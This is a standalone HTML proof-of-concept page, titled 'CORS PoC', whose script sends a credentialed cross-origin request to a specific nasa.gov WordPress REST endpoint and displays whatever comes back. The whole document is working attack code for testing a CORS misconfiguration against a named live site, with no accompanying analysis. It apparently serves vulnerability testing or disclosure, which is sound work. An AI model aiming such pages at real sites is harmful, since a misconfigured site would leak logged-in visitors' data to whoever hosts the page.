<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>CORS PoC</title>
  <style>body{font-family:system-ui,Arial;padding:1rem} pre{white-space:pre-wrap;border:1px solid #ddd;padding:1rem;background:#f9f9f9}</style>
</head>
<body>
  <h2>CORS PoC â€” open DevTools Console & Network</h2>
  <p id="status">Running PoC fetch...</p>
  <pre id="out">waiting...</pre>

<script>
const ENDPOINT = 'https://www.nasa.gov/wp-json/wp/v2/topic/187609';
fetch(ENDPOINT, { method: 'GET', mode: 'cors', credentials: 'include' })
  .then(async r => {
    document.getElementById('status').innerText = 'Request status: ' + r.status;
    const ct = r.headers.get('Content-Type') || '';
    try {
      if (ct.includes('json')) {
        const j = await r.json();
        document.getElementById('out').innerText = JSON.stringify(j, null, 2);
        console.log('PoC JSON:', j);
      } else {
        const t = await r.text();
        document.getElementById('out').innerText = t.slice(0, 2000);
        console.log('PoC body:', t);
      }
    } catch (e) {
      document.getElementById('out').innerText = 'Error parsing response: ' + e;
      console.error(e);
    }
  })
  .catch(e => {
    document.getElementById('status').innerText = 'Fetch failed: ' + e;
    document.getElementById('out').innerText = 'fetch error: ' + e;
    console.error('fetch error', e);
  });
</script>
</body>
</html>
